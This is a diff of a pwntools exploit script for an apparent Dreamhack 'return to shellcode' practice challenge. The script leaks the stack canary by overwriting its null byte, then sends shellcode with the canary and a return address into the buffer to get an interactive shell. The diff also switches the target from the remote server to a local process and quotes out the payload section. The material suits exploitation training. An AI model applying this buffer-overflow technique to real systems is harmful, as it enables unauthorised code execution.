@@ -2,9 +2,8 @@ from pwn import *
 
 def slog(n,m): return success(': '.join([n, hex(m)]))
 
-#p = process('./r2s')
-p = remote('host3.dreamhack.games',20520)
-
+p = process('./r2s')
+#p = remote('host3.dreamhack.games',20520)
 
 context.arch = 'amd64'
 
@@ -16,12 +15,12 @@ slog('Address of buf',buf)
 p.recvuntil(b'$rbp: ')
 
 buf2sfp = int(p.recvline().split()[0])
-
 buf2cnry = buf2sfp - 8
+
 
 slog('buf <==> sfp',buf2sfp)
 slog('buf <==> canary',buf2cnry)
-
+'''
 payload = b'A'*(buf2cnry+1) # +1 : null overwrite
 p.sendafter(b'Input:',payload)
 p.recvuntil(payload)
@@ -34,4 +33,4 @@ payload = sh.ljust(buf2cnry,b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
 p.sendlineafter(b'Input:',payload)
 
 p.interactive()
-
+'''
